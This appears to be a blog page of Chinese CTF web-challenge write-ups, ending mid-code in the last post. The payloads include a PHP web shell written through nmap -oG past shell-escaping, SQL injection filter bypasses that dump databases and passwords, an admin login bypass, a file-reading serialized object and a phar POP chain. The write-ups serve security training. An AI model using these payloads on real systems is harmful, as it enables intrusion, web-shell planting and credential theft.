      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-escapeshellarg和escapeshellcmd函数重过滤绕过" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/29/escapeshellarg%E5%92%8Cescapeshellcmd%E5%87%BD%E6%95%B0%E9%87%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="article-date">
  	<time datetime="2021-08-28T16:00:00.000Z" itemprop="datePublished">2021-08-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/29/escapeshellarg%E5%92%8Cescapeshellcmd%E5%87%BD%E6%95%B0%E9%87%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/">
        escapeshellarg和escapeshellcmd函数重过滤绕过
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="nmap命令与escapeshellarg和escapeshellcmd函数"><a href="#nmap命令与escapeshellarg和escapeshellcmd函数" class="headerlink" title="nmap命令与escapeshellarg和escapeshellcmd函数"></a>nmap命令与escapeshellarg和escapeshellcmd函数</h1><p>打开页面，可以看见源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的X-Foewarded-For和Remote-Addr是服务器用来获取ip的，而escapeshellarg()和escapeshellcmd()函数是对特殊字符进行转义的</p>
<p>escapeshellarg()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg()函数会对单引号用反斜杠进行转义，并再用单引号将左右两部分括起来，起到连接的作用</span><br></pre></td></tr></table></figure>
<p>escapeshellcmd()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对特殊字符加反斜杠进行转义，特殊字符为：&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF，以及&#x27;和&quot;在不配对的情况下，以及%和！</span><br><span class="line"></span><br><span class="line">在windows情况下，会将这些特殊字符转化为空格，而在linux下，如果是在system()函数中，\的转义会失效</span><br></pre></td></tr></table></figure>

<p>而使用|&amp;或&amp;&amp;通道的方式，会受到escapeshellarg()和escapeshellcmd()函数转义的影响，而nmap命令可以使用-oG来创建php文件并写入内容</p>
<p>因此，我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php @eval($_POST[&#x27;host&#x27;]); ?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>
<p>来上传木马，而后会显示出文件的位置，最后用蚁剑连接就行</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-union绕过(反序列化)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/28/union%E7%BB%95%E8%BF%87(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/" class="article-date">
  	<time datetime="2021-08-27T16:00:00.000Z" itemprop="datePublished">2021-08-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/28/union%E7%BB%95%E8%BF%87(%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/">
        union绕过(反序列化)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="union绕过-反序列化）"><a href="#union绕过-反序列化）" class="headerlink" title="union绕过(反序列化）"></a>union绕过(反序列化）</h1><p>通过看到/view.php?no=1，可以猜测可能是一个注入点，因此构造常见闭合点，可知数字型注入<br>通过构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2,3,4%23</span><br></pre></td></tr></table></figure>
<p>返回的信息可知，union被过滤点，因此可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”union“相当于”/*!union*/“</span><br></pre></td></tr></table></figure>
<p>进行绕过，而后进行联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">-1 /*!union*/ select 1,database(),3,4%23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,database(),3,4 limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据表</span><br><span class="line">-1 /*!union*/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27; %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列</span><br><span class="line">-1 /*!union*/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列中字段的内容</span><br><span class="line">-1 /*!union*/ select 1,group_concat(no,&quot;----&quot;,username,&quot;----&quot;,passwd,&quot;----&quot;,data),3,4 from fakebook.users %23</span><br><span class="line"></span><br><span class="line">1 /*!union*/ select 1,group_concat(no,&quot;----&quot;,username,&quot;----&quot;,passwd,&quot;----&quot;,data),3,4 from fakebook.users limit 1 offset 0%23</span><br></pre></td></tr></table></figure>
<p>而后看到出现no、username、passwd、data字段的内容，可以看到data字段是序列化的内容，因此我们可以试一下robots.txt来读取源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以用file://协议来读取flag文件，猜测文件在/var/www/html/目录下，因此可以构造exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new UserInfo();</span><br><span class="line">$a-&gt;name=admin;</span><br><span class="line">$a-&gt;age=12;</span><br><span class="line">$a-&gt;blog=file://var/www/html/flag.php</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>而后构造payload，来控制检索的data数据，即可读出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 /*!union*/ select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-双写绕过(联合注入)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/" class="article-date">
  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/27/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/">
        双写绕过(联合注入)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>通过在username和password中构造可疑闭合点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：admin&#x27;、admin&quot;、admin&quot;)、admin&#x27;)</span><br><span class="line"></span><br><span class="line">password：admin&#x27;、admin&quot;、admin&quot;)、admin&#x27;)</span><br></pre></td></tr></table></figure>
<p>发现注入点在password，且闭合是单引号，我们可以通过双写绕过的方式来进行联合注入</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">admin&#x27; ununionion seleselectct group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) frfromom infoorrmation_schema.schemata limit 1 offset 0--+</span><br><span class="line"></span><br><span class="line">报数据表</span><br><span class="line">admin&#x27; ununionion seleselectct group_concat(table_name),group_concat(table_name),group_concat(table_name) frfromom infoorrmation_schema.tables limit 1 offset 0%23</span><br><span class="line">admin&#x27; ununionion seleselectct table_name,table_name,table_name frfromom infoorrmation_schema.tables limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">报数据列</span><br><span class="line">admin&#x27; ununionion seleselectct column_name,column_name,column_name frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;Flag&#x27; limit 1 offset 0%23</span><br><span class="line"></span><br><span class="line">爆数据列中的内容</span><br><span class="line">admin&#x27; ununionion seleselectct flag,flag,flag frfromom ctf.Flag limit 1 offset 0%23</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>的解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from table limit 2,1;</span><br><span class="line">//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from table limit 2 offset 1;</span><br><span class="line">//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-报错注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/27/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/27/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
        报错注入(=和空格的过滤)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="报错注入之等于号和空格的过滤"><a href="#报错注入之等于号和空格的过滤" class="headerlink" title="报错注入之等于号和空格的过滤"></a>报错注入之等于号和空格的过滤</h1><p>等于号和空格的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;=&quot;相当于&quot;like&quot;</span><br><span class="line"></span><br><span class="line">&quot;空格&quot;相当于&quot;()&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>闭合点为单引号闭合，因此可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23</span><br><span class="line"></span><br><span class="line">爆数据表</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23</span><br><span class="line"></span><br><span class="line">爆数据列</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23</span><br><span class="line"></span><br><span class="line">爆数据列中的内容</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23</span><br><span class="line"></span><br><span class="line">左边内容</span><br><span class="line">aaa&#x27;^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23</span><br><span class="line"></span><br><span class="line">右边内容</span><br><span class="line">aaa&#x27;^extractvalue(1,left(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-逻辑sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/27/%E9%80%BB%E8%BE%91sql%E6%B3%A8%E5%85%A5/" class="article-date">
  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/27/%E9%80%BB%E8%BE%91sql%E6%B3%A8%E5%85%A5/">
        逻辑sql注入
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="逻辑sql注入"><a href="#逻辑sql注入" class="headerlink" title="逻辑sql注入"></a>逻辑sql注入</h1><p>关键词判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">联合注入：unin被过滤</span><br><span class="line">报错注入：and、or、updatexml被过滤</span><br><span class="line">bool注入和time注入：and、or被过滤</span><br></pre></td></tr></table></figure>

<p>打开页面源码，看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure>
<p>由于base32的特征是纯大写+数字，所以进行base32解密，得到有等于号的字母加数字，猜测是base64，进行base64解密，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
<p>可见在username中有注入点，由于=和or被过滤，所以可以使用&lt;&gt;或like来代替=，用0r来代替or，不过也报错</p>
<p>因此，我们可以从后端逻辑出发，一般是：先检索数据。拿出username的键值来进行对比，如果错误，则报错，如果正确，则进行下一步，再拿password的键值与我们输入的password进行比较</p>
<p>不过放在数据库里用于比较的键值都是加密的，加密方式有mysql、mysql5、md5等，我们可以猜想它的工作的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$data = 检索数据。</span><br><span class="line">if ($data[&#x27;username&#x27;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">	if ($data[&#x27;password&#x27;] === md5($pw)) &#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因此我们可以使用联合注入来操纵检索数据，一般数据列中的字段都是id,username,password，所以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1,admin,输入密码的md5值%23&amp;pw=输入密码</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-phar反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  	<time datetime="2021-08-21T16:00:00.000Z" itemprop="datePublished">2021-08-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        phar反序列化
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="phar反序列化（吃瓜杯attup"><a href="#phar反序列化（吃瓜杯attup" class="headerlink" title="phar反序列化（吃瓜杯attup)"></a>phar反序列化（吃瓜杯attup)</h1><p>打开页面，可知只能是zip、rar、tar文件可以上传，因此我们随意构造一个zip文件上传<br>然后查询上传的zip文件，之后打开页面源码，发现有一处源码泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_POST[&quot;file&quot;];</span><br><span class="line">$stat = @stat($filename);</span><br></pre></td></tr></table></figure>
<p>其中stat()这个函数用的很少, 用于返回关于文件的信息, 但是它也可以触发 phar 文件, 这里主要是考察了通过 zip 或 tar 文件包装的phar文件进行触发<br>phar反序列化详细请看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
<p>因此我们可以构造pop链并压缩成zip文件或tar文件并包装成phar文件的格式上传，phar文件可以绕过&lt;?和php的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">zip</span><br><span class="line"></span><br><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new View();</span><br><span class="line">$a-&gt;fn = &#x27;/flag&#x27;;</span><br><span class="line">$b = new Fun();</span><br><span class="line">$b-&gt;fun = $a;</span><br><span class="line">$c = new Fun();</span><br><span class="line">$c-&gt;fun = $b;</span><br><span class="line">$d = serialize($c);</span><br><span class="line">if(file_exists(&#x27;phar.zip&#x27;)) &#123;</span><br><span class="line">    @unlink(&quot;phar.zip&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$zip = new ZipArchive;</span><br><span class="line">$res = $zip-&gt;open(&#x27;phar.zip&#x27;, 